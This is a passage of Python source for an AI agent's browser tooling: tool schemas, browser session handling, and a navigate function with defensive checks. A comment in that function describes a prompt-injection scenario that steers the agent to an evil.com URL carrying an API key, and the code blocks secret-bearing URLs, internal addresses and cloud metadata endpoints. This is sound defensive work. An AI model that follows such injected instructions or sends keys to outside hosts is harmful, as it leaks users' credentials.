        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating. For advanced browser capabilities (file downloads, multi-tab navigation, cookie injection, viewport / user-agent / geolocation configuration, element-level screenshots), use `search_tools` or rely on dynamic tool discovery (`tools.sync`) — those tools are not in the always-visible core set.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "The URL to navigate to (e.g., 'https://example.com')"}}, "required": ["url"]},
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False,
                },
            },
            "required": [],
        },
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {"ref": {"type": "string", "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"}},
            "required": ["ref"],
        },
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "The element reference from the snapshot (e.g., '@e3')"},
                "text": {"type": "string", "description": "The text to type into the field"},
            },
            "required": ["ref", "text"],
        },
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {"direction": {"type": "string", "enum": ["up", "down"], "description": "Direction to scroll"}}, "required": ["direction"]},
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {"key": {"type": "string", "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"}},
            "required": ["key"],
        },
    },
    {
        "name": "browser_hover",
        "description": "Hover an element (move mouse over it) — triggers CSS :hover rules, dropdown menus, and tooltip previews without clicking. Ref IDs come from browser_snapshot output (e.g. '@e5'). Requires browser_navigate and browser_snapshot first.",
        "parameters": {"type": "object", "properties": {"ref": {"type": "string", "description": "Element reference from the snapshot (e.g. '@e5', '@e12')"}}, "required": ["ref"]},
    },
    {
        "name": "browser_wait_for",
        "description": "Wait until a CSS selector or visible text substring appears in the current page (polls every 200ms via the live DOM). On a successful match the result includes a compact snapshot so you can act without a follow-up browser_snapshot. Set return_snapshot=false to disable the auto-snapshot. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "selector": {
                    "type": "string",
                    "description": "CSS selector to wait for, e.g. '.checkout-button'. Mutually exclusive gating with `text` — at least one must be provided.",
                },
                "text": {"type": "string", "description": "Case-insensitive substring of visible element text to wait for, e.g. 'Order confirmed'."},
                "timeout_s": {"type": "number", "default": 10, "description": "Maximum wait in seconds (default 10)."},
                "return_snapshot": {
                    "type": "boolean",
                    "default": True,
                    "description": "If true (default), include a compact snapshot in the success result. If false, only return the matched element description.",
                },
            },
            "required": [],
        },
    },
    {
        "name": "browser_find",
        "description": "Search the live DOM for elements whose visible text matches a substring. Use this when you want a snapshot ref by text instead of grepping the previous browser_snapshot output (which may be stale after dynamic re-rendering). Returns up to 200 matches. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Case-insensitive text substring to search for, e.g. 'Sign in' or 'Continue'."},
                "ref_only": {"type": "boolean", "default": True, "description": "If true (default), only return ref IDs. If false, also include tag and text for each match."},
            },
            "required": ["query"],
        },
    },
    {
        "name": "browser_drag",
        "description": "Drag an element from one snapshot position to another. Dispatches a CDP mouse event sequence (press → move → release) between the two refs. Works with sortable lists, sliders, and drag-and-drop UIs. Requires browser_navigate and browser_snapshot first.",
        "parameters": {
            "type": "object",
            "properties": {
                "from_ref": {"type": "string", "description": "Source element ref from browser_snapshot (e.g. '@e3')."},
                "to_ref": {"type": "string", "description": "Target element ref from browser_snapshot (e.g. '@e7')."},
                "hold_key": {"type": "string", "enum": ["shift", "ctrl", "alt"], "description": "Optional modifier key held during the drag."},
            },
            "required": ["from_ref", "to_ref"],
        },
    },
    {
        "name": "browser_select",
        "description": "Select an option in a <select> element or a common custom dropdown (Ant Design, Element UI, Material UI, React Select, etc.). For native <select>, sets the value directly. For custom dropdowns, clicks to open then matches by visible text. Requires browser_navigate and browser_snapshot first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "Element ref of the <select> or custom dropdown trigger (e.g. '@e4')."},
                "value": {"type": "string", "description": "Exact option value attribute to select."},
                "label": {"type": "string", "description": "Case-insensitive substring of the visible option text to select."},
                "index": {"type": "integer", "description": "0-based option index to select."},
                "open_delay_s": {
                    "type": "number",
                    "default": 0.5,
                    "description": "Seconds to wait after clicking a custom dropdown for its animation to finish before searching for options (default 0.5).",
                },
            },
            "required": ["ref"],
        },
    },
    {
        "name": "browser_download",
        "description": "Download a file by clicking a link (ref) or navigating to a URL. Blocks until the download completes and returns the local file path. Requires a CDP-capable backend. Files are saved to the browser_downloads cache (24h auto-cleanup).",
        "parameters": {
            "type": "object",
            "properties": {
                "ref_or_url": {"type": "string", "description": "A snapshot ref (@e5) to click, or a full URL to navigate to."},
                "save_as": {"type": "string", "description": "Optional filename override. If omitted, uses the browser's suggested filename."},
                "timeout_s": {"type": "number", "default": 30, "description": "Max seconds to wait for the download to complete (default 30)."},
            },
            "required": ["ref_or_url"],
        },
    },
    {
        "name": "browser_pdf",
        "description": "Save the current page as a PDF file. Requires a CDP-capable backend (local Chrome or CDP override). Returns the file path, page count, and SHA-256 hash.",
        "parameters": {
            "type": "object",
            "properties": {
                "save_as": {"type": "string", "description": "Optional filename (without path). Defaults to page_<id>.pdf."},
                "landscape": {"type": "boolean", "default": False, "description": "If true, use landscape orientation."},
                "print_background": {"type": "boolean", "default": True, "description": "If true (default), include background graphics."},
                "paper_width": {"type": "number", "default": 8.5, "description": "Page width in inches (default 8.5 / Letter)."},
                "paper_height": {"type": "number", "default": 11, "description": "Page height in inches (default 11 / Letter)."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_screenshot_element",
        "description": "Capture a screenshot of a single element identified by its snapshot ref. Returns the image file path. Uses getBoundingClientRect for positioning — CSS transforms (rotate/scale) are not accounted for. Requires a CDP-capable backend.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {"type": "string", "description": "Element ref from browser_snapshot (e.g. '@e5')."},
                "save_as": {"type": "string", "description": "Optional filename (without path). Defaults to element_<id>.png."},
            },
            "required": ["ref"],
        },
    },
    {
        "name": "browser_tab_new",
        "description": "Open a new browser tab and switch to it. The new tab becomes the active target — subsequent browser_* calls operate on it. Requires a CDP-capable backend (not Camofox).",
        "parameters": {
            "type": "object",
            "properties": {"url": {"type": "string", "description": "Optional URL to navigate the new tab to. If omitted, opens an empty tab."}},
            "required": [],
        },
    },
    {
        "name": "browser_tab_switch",
        "description": "Switch the active tab to tab_id. Subsequent CDP operations route there. tab_id values come from browser_tab_list or browser_tab_new.",
        "parameters": {"type": "object", "properties": {"tab_id": {"type": "string", "description": "The target tab ID (e.g. 'ABC123...')."}}, "required": ["tab_id"]},
    },
    {
        "name": "browser_tab_close",
        "description": "Close a tab. Defaults to closing the currently active tab. After close, CDP routing falls back to the initial page if the closed tab was active.",
        "parameters": {"type": "object", "properties": {"tab_id": {"type": "string", "description": "Tab ID to close. If omitted, closes the active tab."}}, "required": []},
    },
    {
        "name": "browser_tab_list",
        "description": "List all browser tabs currently open. Read-only — does not mutate state. Returns tab_id, url, title, and active_tab_id.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_set_viewport",
        "description": "Override the browser viewport size (CDP Emulation.setDeviceMetricsOverride). Persists until next call or page reload. Use to test mobile layouts without a real device. Requires a CDP-capable backend.",
        "parameters": {
            "type": "object",
            "properties": {
                "width": {"type": "integer", "description": "Viewport width in CSS pixels."},
                "height": {"type": "integer", "description": "Viewport height in CSS pixels."},
                "device_scale_factor": {"type": "number", "default": 1.0, "description": "Device pixel ratio (default 1.0)."},
                "mobile": {"type": "boolean", "default": False, "description": "If true, the browser reports a mobile UA and viewport."},
            },
            "required": ["width", "height"],
        },
    },
    {
        "name": "browser_set_user_agent",
        "description": "Override the user-agent string sent on subsequent navigations (CDP Network.setUserAgentOverride). Pass None to clear the override.",
        "parameters": {
            "type": "object",
            "properties": {
                "user_agent": {"type": "string", "description": "Full UA override (e.g. 'Mozilla/5.0 ... Mobile/15E148 Safari/604.1')."},
                "platform": {"type": "string", "description": "Optional navigator.platform value (e.g. 'iPhone')."},
                "accept_language": {"type": "string", "description": "Optional Accept-Language header (e.g. 'en-US,en;q=0.9')."},
            },
            "required": [],
        },
    },
    {
        "name": "browser_set_extra_headers",
        "description": "Replace all extra HTTP headers sent on subsequent navigations (CDP Network.setExtraHTTPHeaders). Wholesale replacement — pass the complete desired set. Empty dict clears all overrides.",
        "parameters": {
            "type": "object",
            "properties": {
                "headers": {
                    "type": "object",
                    "description": 'Header name → value map, e.g. {"Referer": "https://example.com", "X-API-Key": "secret"}.',
                    "additionalProperties": {"type": "string"},
                },
            },
            "required": ["headers"],
        },
    },
    {
        "name": "browser_set_geolocation",
        "description": "Override browser-reported geolocation (CDP Emulation.setGeolocationOverride). Subsequent pages see injected coords via navigator.geolocation. Pass lat=NaN to clear.",
        "parameters": {
            "type": "object",
            "properties": {
                "lat": {"type": "number", "description": "Latitude in decimal degrees. NaN clears the override."},
                "lon": {"type": "number", "description": "Longitude in decimal degrees."},
                "accuracy": {"type": "number", "default": 100, "description": "Accuracy in meters (default 100)."},
            },
            "required": ["lat", "lon"],
        },
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise SpiritAgent falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {"type": "string", "description": "What you want to know about the page visually. Be specific about what you're looking for."},
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout.",
                },
            },
            "required": ["question"],
        },
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {"type": "boolean", "default": False, "description": "If true, clear the message buffers after reading"},
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'",
                },
            },
            "required": [],
        },
    },
]


def _create_local_session(task_id: str) -> dict[str, str]:
    """为 task_id 创建一个新的本地 agent-browser 会话条目。"""
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s", session_name, task_id)
    profile_dir = resolve_profile_dir()
    profile_in_use = is_profile_locked(profile_dir)
    return {"session_name": session_name, "cdp_url": None, "profile_dir": str(profile_dir), "profile_in_use": profile_in_use, "features": {"local": True}}


def _create_cdp_session(task_id: str, cdp_url: str) -> dict[str, str]:
    """创建一个指向用户提供的 CDP 端点的会话条目。"""

    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s", session_name, cdp_url, task_id)
    return {"session_name": session_name, "cdp_url": cdp_url, "features": {"cdp_override": True}}


def _get_session_info(task_id: str | None = None) -> dict[str, str]:
    """获取或创建 task_id 对应的会话；CDP 覆盖模式返回指向用户 CDP 端点的代理，其余生成本地 agent-browser 会话名（``::local`` 后缀用于混合路由的本地 sidecar）。线程安全，可并发。"""
    if task_id is None:
        task_id = "default"

    _start_browser_cleanup_thread()

    _update_session_activity(task_id)

    with _cleanup_lock:
        if task_id in _active_sessions:
            return _active_sessions[task_id]

    # 混合路由：以 ``::local`` 结尾的 session key 强制走本地 Chromium，即使已设置 ``browser.cdp_url``；公开 URL 在同一会话里继续用裸 task_id 的 CDP session。
    force_local = _is_local_sidecar_key(task_id)

    cdp_override = _get_cdp_override()
    session_info = _create_cdp_session(task_id, cdp_override) if cdp_override and not force_local else _create_local_session(task_id)

    with _cleanup_lock:
        # Double-check: another thread may have created a session while we
        # were doing the network call. Use the existing one to avoid leaking
        # orphan sessions.
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        _active_sessions[task_id] = session_info

    # lazy 启动 CDP supervisor（若后端经 override 或 session_info["cdp_url"] 暴露了 CDP URL）。幂等、吞错，详见 _ensure_cdp_supervisor；本地 sidecar 没有 CDP URL 故跳过。
    if not force_local:
        _ensure_cdp_supervisor(task_id)

    return session_info


def _find_agent_browser() -> str:
    """按 PATH → Homebrew/系统 bin → SpiritAgent 管理的 node → 本地 node_modules/.bin → npx 的顺序查找 agent-browser CLI；未安装时抛 FileNotFoundError。"""
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or run 'npm install' in the repo root to install locally.\n"
                "Or ensure npx is available in your PATH.",
            )
        return _cached_agent_browser

    # 注意：_agent_browser_resolved 在每个 return 处才置位（搜索前不置位），防止并发线程看到 resolved=True 时 _cached_agent_browser 还是 None 的竞态。

    which_result = shutil.which("agent-browser")
    if which_result:
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # 构造扩展搜索 PATH，包含 SpiritAgent 管理的 node、macOS versioned Homebrew 安装以及系统 bin 兜底。
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result:
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # Windows 下 npm 在 .bin 放三个 shim：无后缀 POSIX shell 脚本（Git Bash / WSL 用）、agent-browser.cmd（cmd/PowerShell 用）、agent-browser.ps1（PowerShell 用）。Python subprocess 用的 CreateProcess 不能跑无后缀 shim，会抛 WinError 193 "%1 is not a valid Win32 application"。这里必须解析到 .cmd shim；同时通过显式 path 让 POSIX host 仍能选到无后缀 shim。
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which:
            _cached_agent_browser = local_which
            _agent_browser_resolved = True
            return _cached_agent_browser

    npx_path = shutil.which("npx")
    if not npx_path and extended_path:
        npx_path = shutil.which("npx", path=extended_path)
    if npx_path:
        _cached_agent_browser = "npx agent-browser"
        _agent_browser_resolved = True
        return _cached_agent_browser

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH.",
    )


def _extract_screenshot_path_from_text(text: str) -> str | None:
    """从 agent-browser 的人类可读输出里匹配截图文件路径（兼容 POSIX 与 Windows）。"""
    if not text:
        return None

    # ``(?:/|[A-Za-z]:[\\\\/])`` 同时匹配 POSIX 根路径与 Windows 盘符——单独 ``/`` 前缀永远命中不到 ``C:\...\Temp\...``。
    prefix = r"(?:/|[A-Za-z]:[\\\\/])"
    patterns = [
        rf"Screenshot saved to ['\"](?P<path>{prefix}[^'\"]+?\.png)['\"]",
        rf"Screenshot saved to (?P<path>{prefix}\S+?\.png)(?:\s|$)",
        rf"(?P<path>{prefix}\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(task_id: str, command: str, args: list[str] | None = None, timeout: int | None = None, _engine_override: str | None = None) -> dict[str, Any]:
    """对 task_id 当前会话执行一次 agent-browser CLI 命令并解析其 JSON 响应；``_engine_override`` 仅在 Lightpanda→Chrome 回退内部使用。"""
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    # Lightpanda 不需要 Chromium 即可进行文本导航。
    if not _chromium_installed() and _get_browser_engine() != "lightpanda":
        hint = "Chromium browser is missing. Install it with: npx agent-browser install --with-deps (or: npx playwright install --with-deps chromium)"
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {e!s}"}

    # CDP override 与 local 模式共享 --json + command + args；二者只在这两段参数上有差别。
    if session_info.get("cdp_url"):
        # IMPORTANT: 不要同时传 --session 和 --cdp，否则 >=0.13 的 agent-browser 会忽略 --cdp。
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        backend_args = ["--session", session_info["session_name"]]
        # 持久化 cookie / localStorage；profile 已被别的 runner 锁住时跳过，避免互相抢占。
        profile_dir = session_info.get("profile_dir")
        if profile_dir and not session_info.get("profile_in_use"):
            backend_args += ["--user-data-dir", profile_dir]  # type: ignore[arg-type]

    # 以「按会话」而非全局云服务状态判断引擎：hybrid 路由可能让 local sidecar 与 cloud 后端并存。
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # 保持具体可执行文件路径原样（即使含空格）；只有合成的 npx fallback 需要拆成多个 argv。shutil.which 在 Windows 上把 npx 解析为 npx.cmd，POSIX 上保留裸 npx。
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + ["--json", command] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_info['session_name']}")
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # Record this spiritagent PID as the session owner (cross-process safe
        # orphan detection — see _write_owner_pid).
        _write_owner_pid(task_socket_dir, session_info["session_name"])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)", command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = {**os.environ}

        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
        # used during CLI discovery.
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # Tell the agent-browser daemon to self-terminate after being idle
        # for our configured inactivity timeout.  This is the daemon-side
        # counterpart to our Python-side _cleanup_inactive_browser_sessions
        # — the daemon kills itself and its Chrome children when no CLI
        # commands arrive within the window.  Added in agent-browser 0.24.
        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # Inject --no-sandbox when needed:
        # - Running as root: Chromium always refuses to start without it
        # - Ubuntu 23.10+ / AppArmor systems: unprivileged user namespaces
        #   are restricted, causing Chromium to exit with "No usable sandbox"
        #   even for non-root users running under systemd or containers.
        # Honour either the legacy AGENT_BROWSER_CHROME_FLAGS (never consumed by
        # agent-browser itself, but documented in older notes) or the real
        # AGENT_BROWSER_ARGS — if the user pre-sets either, don't overwrite it.
        if "AGENT_BROWSER_ARGS" not in browser_env and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env:
            _needs_sandbox_bypass = False
            if hasattr(os, "geteuid") and os.geteuid() == 0:
                _needs_sandbox_bypass = True
                logger.debug("browser: running as root — injecting --no-sandbox")
            else:
                # Detect AppArmor user namespace restrictions (Ubuntu 23.10+)
                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
                try:
                    with open(_userns_restrict, encoding="utf-8") as _f:
                        if _f.read().strip() == "1":
                            _needs_sandbox_bypass = True
                            logger.debug("browser: AppArmor userns restrictions detected — injecting --no-sandbox")
                except OSError:
                    pass
            if _needs_sandbox_bypass:
                browser_env["AGENT_BROWSER_ARGS"] = "--no-sandbox,--disable-dev-shm-usage"

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # See matching comment at the other Popen site above — on
            # Windows we put agent-browser in its own process group, force
            # stdin/stdout/stderr to three explicit handles (no leaked
            # parent-console handles to confuse the Rust binary's
            # daemon-spawn), and close_fds=True to block inheritance of
            # everything else.
            _popen_extra: dict = {}
            if os.name == "nt":
                # See matching block at the other Popen site — CREATE_NO_WINDOW
                # only, NO CREATE_NEW_PROCESS_GROUP (cancels asyncio loop task
                # on Python 3.11 Windows → KeyboardInterrupt in CLI MainThread).
                _popen_extra["creationflags"] = CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(cmd_parts, stdout=stdout_fd, stderr=stderr_fd, stdin=subprocess.DEVNULL, env=browser_env, **_popen_extra)
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            if not kill_tree(proc.pid, force=True):
                proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)", command, timeout, task_id, task_socket_dir)
            result = {"success": False, "error": f"Command timed out after {timeout} seconds"}

        else:
            with open(stdout_path, encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # Clean up temp files (best-effort)
            for p in (stdout_path, stderr_path):
                with contextlib.suppress(OSError):
                    os.unlink(p)

            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # Empty output with rc=0 is a broken state — treat as failure rather
            # than silently returning {"success": True, "data": {}}.
            # Some commands (close, record) legitimately return no output.
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. Possible stale daemon or CDP connection issue. returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s", command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(part for part in [stdout_text, stderr_text] if part)
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info("browser 'screenshot' recovered file from non-JSON output: %s", recovered_path)
                            result = {"success": True, "data": {"path": recovered_path, "raw": raw}}
                        else:
                            result = {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}
                    else:
                        result = {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}
            elif returncode != 0:
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # Lightpanda → Chrome 自动回退：若引擎为 lightpanda 且结果看起来坏了就用 Chrome 重试，覆盖所有出口路径（timeout、empty、non-JSON、非零 rc、parsed JSON）。
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info("Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s", command, task_id, fallback_reason)
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout) if command == "screenshot" else _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


def browser_navigate(url: str, task_id: str | None = None) -> str:
    """导航到指定 URL 并返回 JSON 结果（含首屏快照、跳转后 SSRF 校验、bot 检测提示）。"""
    # 防密钥外泄：URL query 里塞了 API key / token 的直接拦下，防 prompt injection 把 agent 引到 https://evil.com/steal?key=sk-ant-... 把密钥送走。同时检查 URL-decode 后的形式以覆盖 %2D 等编码绕过。

    url_decoded = unquote(url)
    if SECRET_PREFIX_RE.search(url) or SECRET_PREFIX_RE.search(url_decoded):
        return json.dumps({"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."})
    url = normalize_url_for_request(url)
    normalized_decoded = unquote(url)
    if SECRET_PREFIX_RE.search(url) or SECRET_PREFIX_RE.search(normalized_decoded):
        return json.dumps({"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."})

    # SSRF 保护：导航前拦截私有/内网地址。若该次导航正在走每 task 的本地 Chromium sidecar（私有 URL 自动 spawn）或配置了 ``browser.allow_private_urls`` 则跳过。
    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    # 始终禁止项：云元数据 / IMDS 端点无论后端、混合路由、allow_private_urls 都拒；浏览器去访问 169.254.169.254 / metadata.google.internal / ECS task metadata 没有合法用途，且在 EC2/GCP/Azure 上被路由到本地 Chromium sidecar 会泄 IAM 凭据（#16234）。
    if is_always_blocked_url(url):
        return json.dumps({"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"})

    if not auto_local_this_nav and not _allow_private_urls() and not is_safe_url(url):
        return json.dumps({"success": False, "error": "Blocked: URL targets a private or internal address"})

    # Website policy check
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({"success": False, "error": blocked.message, "blocked_by_policy": {"host": blocked.host, "rule": blocked.rule, "source": blocked.source}})

    # Camofox backend 兜底
    if is_camofox_mode():
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info("browser_navigate: routing %s to local Chromium sidecar (private URL)", url)

    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))

    # 记录这次 nav 用了哪个 session，让同一 task_id 后续的 snapshot/click/fill... 命中同一个（混合路由下 cloud session 和 local sidecar 同时存在时尤为关键）。
    _last_active_session_key[effective_task_id] = nav_session_key

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # Post-redirect SSRF check — if the browser followed a redirect to a
        # private/internal address, block the result so the model can't read
        # internal content via subsequent browser_snapshot calls.
        # Skipped for local backends (same rationale as the pre-nav check),
        # and for the hybrid local sidecar (we're already on a local browser
        # hitting a private URL by design).
